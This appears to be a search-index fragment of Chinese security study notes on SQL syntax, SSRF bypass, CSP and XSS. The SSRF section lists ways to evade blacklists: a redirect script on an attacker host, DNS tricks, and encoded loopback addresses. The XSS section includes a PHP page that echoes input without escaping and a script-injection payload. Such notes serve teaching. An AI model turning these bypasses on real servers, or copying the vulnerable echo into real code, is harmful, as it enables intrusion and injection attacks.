\u4e3a\u80fd\u914d\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u7684\u610f\u601d\u4e3a\u6a21\u7cca\u67e5\u8be2\u4fe1\u606f\u4e3a M \u5f00\u5934\u7684\u3002 %M% : \u8868\u793a\u67e5\u8be2\u5305\u542bM\u7684\u6240\u6709\u5185\u5bb9\u3002 %M_ : \u8868\u793a\u67e5\u8be2\u4ee5M\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u6240\u6709\u5185\u5bb9\u3002 \u4e0d\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\u7684 WHERE \u5b50\u53e5\uff1a(\u611f\u89c9\u5f88\u795e\u5947) \u00b6 WHERE \u5b50\u53e5\u5e76\u4e0d\u4e00\u5b9a\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff0c\u5f53\u4e0d\u5e26\u8fd0\u7b97\u7b26\u65f6\uff0c\u4f1a\u6267\u884c\u4e00\u4e2a\u9690\u5f0f\u8f6c\u6362\u3002\u5f53 0 \u65f6\u8f6c\u5316\u4e3a false\uff0c1 \u8f6c\u5316\u4e3a true\u3002\u4f8b\u5982\uff1a 1 SELECT studentNO FROM student WHERE 0 \u5219\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u96c6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de false\u3002 1 SELECT studentNO FROM student WHERE 1 \u8fd4\u56de student \u8868\u6240\u6709\u884c\u4e2d studentNO \u5217\u7684\u503c\u3002\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de true\u3002 order by \u00b6 ORDER BY \u5173\u952e\u5b57\u7528\u4e8e\u5bf9\u7ed3\u679c\u96c6\u6309\u7167\u4e00\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u8fdb\u884c\u6392\u5e8f\u3002 ORDER BY \u5173\u952e\u5b57\u9ed8\u8ba4\u6309\u7167\u5347\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\u3002\u5982\u679c\u9700\u8981\u6309\u7167\u964d\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 DESC \u5173\u952e\u5b57\u3002","title":"SQL(\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00)\u57fa\u672c\u77e5\u8bc6"},{"location":"SQL/sql\u57fa\u672c\u77e5\u8bc6/#sql","text":"","title":"SQL(\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00)\u57fa\u672c\u77e5\u8bc6"},{"location":"SQL/sql\u57fa\u672c\u77e5\u8bc6/#select","text":"SELECT DISTINCT country FROM Websites; \u4ec5\u4ece \"Websites\" \u8868\u7684 \"country\" \u5217\u4e2d\u9009\u53d6\u552f\u4e00\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u5c31\u662f\u53bb\u6389 \"country\" \u5217\u91cd\u590d\u503c\uff1a","title":"select"},{"location":"SQL/sql\u57fa\u672c\u77e5\u8bc6/#where","text":"\u8fd0\u7b97\u7b26 \u63cf\u8ff0 = \u7b49\u4e8e <> \u4e0d\u7b49\u4e8e\u3002 \u6ce8\u91ca\uff1a \u5728 SQL \u7684\u4e00\u4e9b\u7248\u672c\u4e2d\uff0c\u8be5\u64cd\u4f5c\u7b26\u53ef\u88ab\u5199\u6210 != > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e BETWEEN \u5728\u67d0\u4e2a\u8303\u56f4\u5185 LIKE \u641c\u7d22\u67d0\u79cd\u6a21\u5f0f IN \u6307\u5b9a\u9488\u5bf9\u67d0\u4e2a\u5217\u7684\u591a\u4e2a\u53ef\u80fd\u503c \u5176\u4e2d <>\uff0c between\uff0clike\uff0cin \u8981\u7075\u6d3b\u8fd0\u7528","title":"where\u5b50\u53e5\u652f\u6301\u7684\u8fd0\u7b97\u7b26"},{"location":"SQL/sql\u57fa\u672c\u77e5\u8bc6/#_1","text":"1.\u7a7a\u503c\u5224\u65ad\uff1a is null 1 Select * from emp where comm is null; \u67e5\u8be2 emp \u8868\u4e2d comm \u5217\u4e2d\u7684\u7a7a\u503c\u3002 2.between and (\u5728 \u4e4b\u95f4\u7684\u503c) 1 Select * from emp where sal between 1500 and 3000 ; 3.In 1 Select * from emp where sal in (5000,3000,1500); \u67e5\u8be2 EMP \u8868 SAL \u5217\u4e2d\u7b49\u4e8e 5000\uff0c3000\uff0c1500 \u7684\u503c\u3002 4.like Like\u6a21\u7cca\u67e5\u8be2 1 Select * from emp where ename like 'M%'; \u67e5\u8be2 EMP \u8868\u4e2d Ename \u5217\u4e2d\u6709 M \u7684\u503c\uff0cM \u4e3a\u8981\u67e5\u8be2\u5185\u5bb9\u4e2d\u7684\u6a21\u7cca\u4fe1\u606f\u3002 % \u8868\u793a\u591a\u4e2a\u5b57\u503c\uff0c _ \u4e0b\u5212\u7ebf\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff1b M% : \u4e3a\u80fd\u914d\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u7684\u610f\u601d\u4e3a\u6a21\u7cca\u67e5\u8be2\u4fe1\u606f\u4e3a M \u5f00\u5934\u7684\u3002 %M% : \u8868\u793a\u67e5\u8be2\u5305\u542bM\u7684\u6240\u6709\u5185\u5bb9\u3002 %M_ : \u8868\u793a\u67e5\u8be2\u4ee5M\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u6240\u6709\u5185\u5bb9\u3002","title":"\u4e00\u4e9b\u7279\u6b8a\u6761\u4ef6"},{"location":"SQL/sql\u57fa\u672c\u77e5\u8bc6/#where_1","text":"WHERE \u5b50\u53e5\u5e76\u4e0d\u4e00\u5b9a\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff0c\u5f53\u4e0d\u5e26\u8fd0\u7b97\u7b26\u65f6\uff0c\u4f1a\u6267\u884c\u4e00\u4e2a\u9690\u5f0f\u8f6c\u6362\u3002\u5f53 0 \u65f6\u8f6c\u5316\u4e3a false\uff0c1 \u8f6c\u5316\u4e3a true\u3002\u4f8b\u5982\uff1a 1 SELECT studentNO FROM student WHERE 0 \u5219\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u96c6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de false\u3002 1 SELECT studentNO FROM student WHERE 1 \u8fd4\u56de student \u8868\u6240\u6709\u884c\u4e2d studentNO \u5217\u7684\u503c\u3002\u56e0\u4e3a\u6bcf\u4e00\u884c\u8bb0\u5f55 WHERE \u90fd\u8fd4\u56de true\u3002","title":"\u4e0d\u5e26\u6bd4\u8f83\u8fd0\u7b97\u7b26\u7684 WHERE \u5b50\u53e5\uff1a(\u611f\u89c9\u5f88\u795e\u5947)"},{"location":"SQL/sql\u57fa\u672c\u77e5\u8bc6/#order-by","text":"ORDER BY \u5173\u952e\u5b57\u7528\u4e8e\u5bf9\u7ed3\u679c\u96c6\u6309\u7167\u4e00\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u8fdb\u884c\u6392\u5e8f\u3002 ORDER BY \u5173\u952e\u5b57\u9ed8\u8ba4\u6309\u7167\u5347\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\u3002\u5982\u679c\u9700\u8981\u6309\u7167\u964d\u5e8f\u5bf9\u8bb0\u5f55\u8fdb\u884c\u6392\u5e8f\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 DESC \u5173\u952e\u5b57\u3002","title":"order by"},{"location":"SSRF/","text":"SSRF\u53c2\u8003 \u00b6 bypassing SSRF protection Intro to SSRF","title":"SSRF\u53c2\u8003"},{"location":"SSRF/#ssrf","text":"bypassing SSRF protection Intro to SSRF","title":"SSRF\u53c2\u8003"},{"location":"SSRF/bypassing/","text":"\u7ed5\u8fc7SSRF\u7684\u9632\u5fa1 \u00b6 \u7ed5\u8fc7\u6280\u5de7\uff1a 1\u3001@\u7b26 2\u3001\u5404\u79cdIP\u5730\u5740\u7684\u8fdb\u5236\u8f6c\u6362 3\u3001\u8df3\u8f6c 4\u3001\u77ed\u5730\u5740 5\u3001\u7279\u6b8a\u57df\u540d xxxx.xip.io 6\u3001DNS\u89e3\u6790(\u6bd4\u8f83\u82db\u523b)\uff0c\u5982DNS\u91cd\u7ed1\u5b9a 7\u3001[::] 8\u3001\u5229\u7528\u3002 9\u3001\u5229\u7528curl\u8ddfparse_url\u51fd\u6570\u7684\u5dee\u5f02\u7ed5\u8fc7 \u53c2\u8003\u81ea decade bypassing Blacklist \u00b6 Fooling it with redirects \u00b6 Make the server request a URL that you control that redirects to the blacklisted address. For example, you can host a file with the following content on your web server: 1 <?php header ( \u201clocation : http :// 127.0 . 0.1 \"); ?> Let\u2019s say this file is hosted at http: // attacker.com/redirect.php . This way, when you make the target server request http: // attacker.com/redirect.php , the target server is actually redirected to http://127.0.0.1 , a restricted internal address. \u8ba9\u670d\u52a1\u5668\u53bb\u8bf7\u6c42\u4f60\u7684VPS\u4e0a\u7684\u8fd9\u4e2aPHP\u811a\u672c\uff0c\u7136\u540e\u670d\u52a1\u5668\u5c31\u88ab\u91cd\u5b9a\u5411\u5230\u4e86 127.0.0.1 Tricking it with DNS \u00b6 Modify the A/AAAA record of a domain you control and make it point to internal addresses of the victim\u2019s network. For example, let\u2019s say http://attacker.com is a subdomain that you own. You can create custom hostname to IP address mapping and make http://subdomain.attacker.com resolve to 127.0.0.1. Now when the target server requests http://attacker.com , it would think that your domain is located at 127.0.0.1 and request data from that address! \u901a\u8fc7\u4fee\u6539DNS\u7684\u89e3\u6790\u8bb0\u5f55\u6765\u5b9e\u73b0 using ipv6 address \u00b6 switching out the encoding \u00b6 hex encoding 1 127.0.0.1 translates to 0x7f.0x0.0x0.0x1 Octal encoding 1 127.0.0.1 translates to 0177.0.0.01 Dword encoding So what is 127.0.0.1 in dword? It\u2019s the answer for 127 256\u00b3+0 256\u00b2+0 256\u00b9+1 256\u2070, which is 2130706433. (Whip out that scientific calculator! Or just use a decimal to binary calculator.) Meaning that if you type in http://2130706433 instead of http://127.0.0.1 , it would still be understood! Pretty cool right? URL encoding For example, the word \u201clocalhost\u201d can be represented with its URL encoded equivalent, \u201c%6c%6f%63%61%6c%68%6f%73%74\u201d. So when a server is blocking requests to internal hostnames such as \u201clocalhost\u201d, try it\u2019s URL encoded equivalent! \u5c06localhost\u8fdb\u884cURL\u7f16\u7801 Mixed Encoding It\u2019s mix-and-match time! You could also use a combination of encoding techniques to try to fool the server: maybe this would work? 1 127.0.0.1 translates to 0177.0.0.0x1","title":"\u7ed5\u8fc7SSRF\u7684\u9632\u5fa1"},{"location":"SSRF/bypassing/#ssrf","text":"\u7ed5\u8fc7\u6280\u5de7\uff1a 1\u3001@\u7b26 2\u3001\u5404\u79cdIP\u5730\u5740\u7684\u8fdb\u5236\u8f6c\u6362 3\u3001\u8df3\u8f6c 4\u3001\u77ed\u5730\u5740 5\u3001\u7279\u6b8a\u57df\u540d xxxx.xip.io 6\u3001DNS\u89e3\u6790(\u6bd4\u8f83\u82db\u523b)\uff0c\u5982DNS\u91cd\u7ed1\u5b9a 7\u3001[::] 8\u3001\u5229\u7528\u3002 9\u3001\u5229\u7528curl\u8ddfparse_url\u51fd\u6570\u7684\u5dee\u5f02\u7ed5\u8fc7 \u53c2\u8003\u81ea decade","title":"\u7ed5\u8fc7SSRF\u7684\u9632\u5fa1"},{"location":"SSRF/bypassing/#bypassing-blacklist","text":"","title":"bypassing Blacklist"},{"location":"SSRF/bypassing/#fooling-it-with-redirects","text":"Make the server request a URL that you control that redirects to the blacklisted address. For example, you can host a file with the following content on your web server: 1 <?php header ( \u201clocation : http :// 127.0 . 0.1 \"); ?> Let\u2019s say this file is hosted at http: // attacker.com/redirect.php . This way, when you make the target server request http: // attacker.com/redirect.php , the target server is actually redirected to http://127.0.0.1 , a restricted internal address. \u8ba9\u670d\u52a1\u5668\u53bb\u8bf7\u6c42\u4f60\u7684VPS\u4e0a\u7684\u8fd9\u4e2aPHP\u811a\u672c\uff0c\u7136\u540e\u670d\u52a1\u5668\u5c31\u88ab\u91cd\u5b9a\u5411\u5230\u4e86 127.0.0.1","title":"Fooling it with redirects"},{"location":"SSRF/bypassing/#tricking-it-with-dns","text":"Modify the A/AAAA record of a domain you control and make it point to internal addresses of the victim\u2019s network. For example, let\u2019s say http://attacker.com is a subdomain that you own. You can create custom hostname to IP address mapping and make http://subdomain.attacker.com resolve to 127.0.0.1. Now when the target server requests http://attacker.com , it would think that your domain is located at 127.0.0.1 and request data from that address! \u901a\u8fc7\u4fee\u6539DNS\u7684\u89e3\u6790\u8bb0\u5f55\u6765\u5b9e\u73b0","title":"Tricking it with DNS"},{"location":"SSRF/bypassing/#using-ipv6-address","text":"","title":"using ipv6 address"},{"location":"SSRF/bypassing/#switching-out-the-encoding","text":"hex encoding 1 127.0.0.1 translates to 0x7f.0x0.0x0.0x1 Octal encoding 1 127.0.0.1 translates to 0177.0.0.01 Dword encoding So what is 127.0.0.1 in dword? It\u2019s the answer for 127 256\u00b3+0 256\u00b2+0 256\u00b9+1 256\u2070, which is 2130706433. (Whip out that scientific calculator! Or just use a decimal to binary calculator.) Meaning that if you type in http://2130706433 instead of http://127.0.0.1 , it would still be understood! Pretty cool right? URL encoding For example, the word \u201clocalhost\u201d can be represented with its URL encoded equivalent, \u201c%6c%6f%63%61%6c%68%6f%73%74\u201d. So when a server is blocking requests to internal hostnames such as \u201clocalhost\u201d, try it\u2019s URL encoded equivalent! \u5c06localhost\u8fdb\u884cURL\u7f16\u7801 Mixed Encoding It\u2019s mix-and-match time! You could also use a combination of encoding techniques to try to fool the server: maybe this would work? 1 127.0.0.1 translates to 0177.0.0.0x1","title":"switching out the encoding"},{"location":"XSS/","text":"XSS \u00b6","title":"XSS"},{"location":"XSS/#xss","text":"","title":"XSS"},{"location":"XSS/CSP/","text":"CSP \u00b6 CSP \u5e76\u4e0d\u662f\u7528\u6765\u9632\u6b62 xss \u653b\u51fb\u7684, \u800c\u662f\u6700\u5c0f\u5316 xss \u53d1\u751f\u540e\u6240\u9020\u6210\u7684\u4f24\u5bb3. \u5b9e\u9645\u4e0a, \u9664\u4e86\u5f00\u53d1\u8005\u81ea\u5df1\u505a\u597d xss \u8f6c\u4e49, \u5e76\u6ca1\u6709\u522b\u7684\u65b9\u6cd5\u53ef\u4ee5\u9632\u6b62 xss \u7684\u53d1\u751f. CSP \u53ef\u4ee5\u8bf4\u662fHTML5\u7ed9web\u5b89\u5168\u5e26\u6765\u7684\u6700\u5b9e\u60e0\u7684\u4e1c\u897f. \u90a3\u4e48\u5982\u4f55\u5f15\u5165 CSP \u5462? \u901a\u8fc7response\u5934 \u53ea\u5141\u8bb8\u811a\u672c\u4ece\u672c\u6e90\u52a0\u8f7dContent-Security-Policy: script-src \u2018self\u2019 \u901a\u8fc7HTML\u7684META\u6807\u7b7e \u4f5c\u7528\u540c\u4e0a \u90a3\u4e48CSP \u9664\u4e86\u9650\u5236script-src \u4e4b\u5916\u8fd8\u80fd\u9650\u5236\u4ec0\u4e48\u5462\uff1f base-uri : \u9650\u5236\u8fd9\u7bc7\u6587\u6863\u7684uri child-src \uff1a\u9650\u5236\u5b50\u7a97\u53e3\u7684\u6e90(iframe,\u5f39\u7a97\u7b49),\u53d6\u4ee3frame-src connect-src \uff1a\u9650\u5236\u811a\u672c\u53ef\u4ee5\u8bbf\u95ee\u7684\u6e90 font-src : \u9650\u5236\u5b57\u4f53\u7684\u6e90 form-action : \u9650\u5236\u8868\u5355\u80fd\u591f\u63d0\u4ea4\u5230\u7684\u6e90 frame-ancestors : \u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u88ab\u54ea\u4e9b\u9875\u9762\u4ee5iframe,frame,object\u7b49\u65b9\u5f0f\u52a0\u8f7d frame-src \uff1adeprecated with child-src,\u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u54ea\u4e9b\u6e90\uff0c\u4e0eframe-ancestors\u5bf9\u5e94 img-src : \u9650\u5236\u56fe\u7247\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d media-src : \u9650\u5236video, audio, source, track \u80fd\u591f\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d object-src \uff1a\u9650\u5236\u63d2\u4ef6\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d sandbox \uff1a\u5f3a\u5236\u6253\u5f00\u6c99\u76d2\u6a21\u5f0f \u53ef\u4ee5\u770b\u51fa, CSP\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u7b56\u7565, \u51e0\u4e4e\u53ef\u4ee5\u9650\u5236\u4e86\u6240\u6709\u80fd\u591f\u7528\u5230\u7684\u8d44\u6e90\u7684\u6765\u6e90. \u4f7f\u7528\u597dCSP\u53ef\u4ee5\u5f88\u5927\u6210\u90fd\u964d\u4f4eXSS\u5e26\u6765\u7684\u98ce\u9669. \u53e6\u5916, CSP\u8fd8\u63d0\u4f9b\u4e00\u4e2a\u62a5\u544a\u7684\u5934\u57df Content-Security-Policy-Report-Only , \u4f7f\u7528\u8fd9\u4e2a\u5934\u57df, \u6d4f\u89c8\u5668\u4f1a\u5411\u670d\u52a1\u5668\u62a5\u544acsp\u72b6\u6001. 1 Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://cspReport/ \u4f7f\u7528\u4e86\u4e0a\u9762\u7684\u8bbe\u7f6e, \u82e5\u9875\u9762\u4e0a\u5b58\u5728\u5185\u8054\u7684js, \u5b83\u4f9d\u7136\u4f1a\u6267\u884c, \u4e0d\u8fc7\u6d4f\u89c8\u5668\u4f1a\u5411\u53d1\u9001\u4e00\u4e2apost\u8bf7\u6c42, \u5305\u542b\u5982\u4e0b\u4fe1\u606f. 1 2 3 4 5 6 7 8 9 10 { \"csp-report\": { \"document-uri\": \"http://cspReport/test.php\", \"referrer\": \"\", \"violated-directive\": \"script-src 'self'\", \"original-policy\": \"script-src 'self'; report-uri http://cspReport/\", \"blocked-uri\": \"\" } } CSP \u76ee\u524d\u6709\u4e24\u7248, [CSP1][] \u548c [CSP2][]. \u4e24\u7248\u7684\u652f\u6301\u72b6\u6001\u53ef\u4ee5\u5728 http://caniuse.com/#search=csp \u4e2d\u67e5\u5230. \u5982\u4e0b: CSP1\u652f\u6301\u6027 CSP2\u652f\u6301\u6027 CSP\u867d\u7136\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u5b89\u5168\u4fdd\u62a4, \u4f46\u662f\u4ed6\u4e5f\u9020\u6210\u4e86\u5982\u4e0b\u95ee\u9898: Eval\u53ca\u76f8\u5173\u51fd\u6570\u88ab\u7981\u7528\u3001\u5185\u5d4c\u7684JavaScript\u4ee3\u7801\u5c06\u4e0d\u4f1a\u6267\u884c\u3001\u53ea\u80fd\u901a\u8fc7\u767d\u540d\u5355\u6765\u52a0\u8f7d\u8fdc\u7a0b\u811a\u672c. XSS\u653b\u9632\u6d45\u8c08","title":"CSP"},{"location":"XSS/CSP/#csp","text":"CSP \u5e76\u4e0d\u662f\u7528\u6765\u9632\u6b62 xss \u653b\u51fb\u7684, \u800c\u662f\u6700\u5c0f\u5316 xss \u53d1\u751f\u540e\u6240\u9020\u6210\u7684\u4f24\u5bb3. \u5b9e\u9645\u4e0a, \u9664\u4e86\u5f00\u53d1\u8005\u81ea\u5df1\u505a\u597d xss \u8f6c\u4e49, \u5e76\u6ca1\u6709\u522b\u7684\u65b9\u6cd5\u53ef\u4ee5\u9632\u6b62 xss \u7684\u53d1\u751f. CSP \u53ef\u4ee5\u8bf4\u662fHTML5\u7ed9web\u5b89\u5168\u5e26\u6765\u7684\u6700\u5b9e\u60e0\u7684\u4e1c\u897f. \u90a3\u4e48\u5982\u4f55\u5f15\u5165 CSP \u5462? \u901a\u8fc7response\u5934 \u53ea\u5141\u8bb8\u811a\u672c\u4ece\u672c\u6e90\u52a0\u8f7dContent-Security-Policy: script-src \u2018self\u2019 \u901a\u8fc7HTML\u7684META\u6807\u7b7e \u4f5c\u7528\u540c\u4e0a \u90a3\u4e48CSP \u9664\u4e86\u9650\u5236script-src \u4e4b\u5916\u8fd8\u80fd\u9650\u5236\u4ec0\u4e48\u5462\uff1f base-uri : \u9650\u5236\u8fd9\u7bc7\u6587\u6863\u7684uri child-src \uff1a\u9650\u5236\u5b50\u7a97\u53e3\u7684\u6e90(iframe,\u5f39\u7a97\u7b49),\u53d6\u4ee3frame-src connect-src \uff1a\u9650\u5236\u811a\u672c\u53ef\u4ee5\u8bbf\u95ee\u7684\u6e90 font-src : \u9650\u5236\u5b57\u4f53\u7684\u6e90 form-action : \u9650\u5236\u8868\u5355\u80fd\u591f\u63d0\u4ea4\u5230\u7684\u6e90 frame-ancestors : \u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u88ab\u54ea\u4e9b\u9875\u9762\u4ee5iframe,frame,object\u7b49\u65b9\u5f0f\u52a0\u8f7d frame-src \uff1adeprecated with child-src,\u9650\u5236\u4e86\u5f53\u524d\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u54ea\u4e9b\u6e90\uff0c\u4e0eframe-ancestors\u5bf9\u5e94 img-src : \u9650\u5236\u56fe\u7247\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d media-src : \u9650\u5236video, audio, source, track \u80fd\u591f\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d object-src \uff1a\u9650\u5236\u63d2\u4ef6\u53ef\u4ee5\u4ece\u54ea\u4e9b\u6e90\u52a0\u8f7d sandbox \uff1a\u5f3a\u5236\u6253\u5f00\u6c99\u76d2\u6a21\u5f0f \u53ef\u4ee5\u770b\u51fa, CSP\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u7b56\u7565, \u51e0\u4e4e\u53ef\u4ee5\u9650\u5236\u4e86\u6240\u6709\u80fd\u591f\u7528\u5230\u7684\u8d44\u6e90\u7684\u6765\u6e90. \u4f7f\u7528\u597dCSP\u53ef\u4ee5\u5f88\u5927\u6210\u90fd\u964d\u4f4eXSS\u5e26\u6765\u7684\u98ce\u9669. \u53e6\u5916, CSP\u8fd8\u63d0\u4f9b\u4e00\u4e2a\u62a5\u544a\u7684\u5934\u57df Content-Security-Policy-Report-Only , \u4f7f\u7528\u8fd9\u4e2a\u5934\u57df, \u6d4f\u89c8\u5668\u4f1a\u5411\u670d\u52a1\u5668\u62a5\u544acsp\u72b6\u6001. 1 Content-Security-Policy-Report-Only: script-src 'self'; report-uri http://cspReport/ \u4f7f\u7528\u4e86\u4e0a\u9762\u7684\u8bbe\u7f6e, \u82e5\u9875\u9762\u4e0a\u5b58\u5728\u5185\u8054\u7684js, \u5b83\u4f9d\u7136\u4f1a\u6267\u884c, \u4e0d\u8fc7\u6d4f\u89c8\u5668\u4f1a\u5411\u53d1\u9001\u4e00\u4e2apost\u8bf7\u6c42, \u5305\u542b\u5982\u4e0b\u4fe1\u606f. 1 2 3 4 5 6 7 8 9 10 { \"csp-report\": { \"document-uri\": \"http://cspReport/test.php\", \"referrer\": \"\", \"violated-directive\": \"script-src 'self'\", \"original-policy\": \"script-src 'self'; report-uri http://cspReport/\", \"blocked-uri\": \"\" } } CSP \u76ee\u524d\u6709\u4e24\u7248, [CSP1][] \u548c [CSP2][]. \u4e24\u7248\u7684\u652f\u6301\u72b6\u6001\u53ef\u4ee5\u5728 http://caniuse.com/#search=csp \u4e2d\u67e5\u5230. \u5982\u4e0b: CSP1\u652f\u6301\u6027 CSP2\u652f\u6301\u6027 CSP\u867d\u7136\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u5b89\u5168\u4fdd\u62a4, \u4f46\u662f\u4ed6\u4e5f\u9020\u6210\u4e86\u5982\u4e0b\u95ee\u9898: Eval\u53ca\u76f8\u5173\u51fd\u6570\u88ab\u7981\u7528\u3001\u5185\u5d4c\u7684JavaScript\u4ee3\u7801\u5c06\u4e0d\u4f1a\u6267\u884c\u3001\u53ea\u80fd\u901a\u8fc7\u767d\u540d\u5355\u6765\u52a0\u8f7d\u8fdc\u7a0b\u811a\u672c. XSS\u653b\u9632\u6d45\u8c08","title":"CSP"},{"location":"XSS/XSSauditor/","text":"XSS \u00b6 \u4e00\u4e2a\u7ecf\u5178\u7684\u4f8b\u5b50 \u00b6 \u5047\u8bbe\u6709\u4e00\u4e2a\u641c\u7d22\u9875\u9762\uff0c\u5173\u952e\u5b57\u4ee5Get\u65b9\u6cd5\u4f20\u9012\u3002\u5047\u8bbe\uff0c\u641c\u7d22\u9875\u9762\u5728\u8f93\u51fa\u7ed3\u679c\u65f6\u4f1a\u65e0\u8fc7\u6ee4\u7684\u5c06\u7528\u6237\u7684\u5173\u952e\u5b57\u56de\u663e\u5230\u7f51\u9875\u4e0a\uff0c\u5927\u81f4\u903b\u8f91\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 <?php if ( isset ( $_REQUEST [ \"wd\" ])) $wd = $_REQUEST [ \"wd\" ]; if ( $wd ){ echo \"<div>\u5173\u952e\u5b57' $wd '\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" ; } ?> \u7136\u540e\u641c\u7d22\u8bf7\u6c42\u7684\u94fe\u63a5\u662f: 1 http://localhost/test/haker/xss.php?wd= < script > alert ( \"xss\" )</ script > \u6216\u8005\u4e3a\u4e86\u9690\u853d\u7f16\u4e00\u4e0b\u7801\uff1a 1 http://localhost/test/haker/xss.php?wd=ddd%3Cscript%3Ealert(%22%22)%3C/script%3E \u5982\u679c\u662f\u5728\u51e0\u5e74\u524d\uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u5927\u81f4\u90fd\u4f1a\u5f39\u51fa\u8fd9\u6837\u4e00\u4e2a\u7a97\u53e3\uff1a \u73b0\u5728\uff1a \u662f\u4e71\u7801\uff1f\u6293\u5305\u5427 \u622a\u7136\u4e0d\u540c\uff1f XSS Auditor \u00b6 xss auditor\u662fChrome \u548c Safari\u4e2d\u5185\u5efa\u7684\u4e00\u4e2a\u9632\u5fa1xss\u653b\u51fb\u7684\u529f\u80fd\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5ba1\u8ba1\u5668\uff0c\u6709\u9884\u8bbe\u89c4\u5219\uff0c\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u9488\u5bf9\u4e0a\u8ff0\u8fd9\u79cd\u60c5\u51b5\u3002\u6b64\u529f\u80fd\u9ed8\u8ba4\u662f\u5f00\u542f\u7684\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5173\u95ed\uff0c\u9700\u8981\u5728response header\u4e2d\u663e\u5f0f\u6307\u5b9a\uff1a 1 2 //\u5173\u95ed xss auditor X-XSS-Protection: 0 \u5f53\u7136\uff0c\u66f4\u5f3a\u5927\u7684\u662f\uff0c\u89e6\u53d1\u540e\u8fd8\u53ef\u4ee5\u5c06\u8be6\u60c5\u4e0a\u62a5\uff0c\u4fbf\u4e8e\u5206\u6790\u8ddf\u8e2a\uff1a 1 X-XSS-Protection: 1; report=http://example.com/your_report_URI\u590d\u5236\u4ee3\u7801 \u4e5f\u53ef\u4ee5\u4f7f\u7528block\u6a21\u5f0f\uff1a\u4e00\u65e6\u89e6\u53d1\uff0c\u5f53\u524d\u9875\u9762\u5c31\u4f1a\u7ec8\u6b62\uff0c\u5e76\u540c\u65f6\u5c55\u793a\u4e00\u4e2a\u7a7a\u767d\u9875\u9762\u7ed9\u7528\u6237\uff1a 1 X-XSS-Protection: 1; mode=block\u590d\u5236\u4ee3\u7801 \u5982\u679c\u5c06\u8bf7\u6c42\u6362\u6210post\uff0cxss auditor\u8fd8\u4f1a\u88ab\u89e6\u53d1\u5417\uff1f\u7b54\u6848\u662f\uff1a\u53ef\u4ee5\uff01 XSS Auditor\u7684\u7f3a\u70b9 \u6211\u4eec\u5c06\u540e\u53f0\u903b\u8f91\u6539\u4e00\u4e0b\uff0c\u7ed9\u6bcf\u4e2a\">\"\u540e\u52a0\u4e00\u4e2a\u5206\u53f7\u3002 1 2 3 4 5 6 7 <?php if(isset($_REQUEST[\"wd\"])) $wd=str_replace(\">\",\">;\",$_REQUEST[\"wd\"]); if($wd){ echo \"<div>\u5173\u952e\u5b57'$wd'\u641c\u7d22\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</div>\" } ?>\u590d\u5236\u4ee3\u7801 \u7136\u540e\u4f9d\u7136\u662f\u4e4b\u524d\u7684\u94fe\u63a5\uff0c\u5237\u65b0\uff1a \u6210\u529f\u4e86\uff0c\u5f53\u7136\u672c\u4f8b\u53ea\u662f\u4e00\u4e2a\u8bf4\u660e\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u90fd\u4f1a\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u4e00\u4e9b\u5904\u7406\uff0c\u5982\u679c\u8fd9\u4e9b\u5904\u7406\u5bfc\u81f4\u548c\u63d0\u4ea4\u7684\u5185\u5bb9\u4e0d\u4e00\u6837\u4e86\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u6267\u884c\uff0c\u6bd4\u5982\u50cf\u672c\u4f8b\u4e00\u6837\u3002\u90a3\u4e48xss auditor 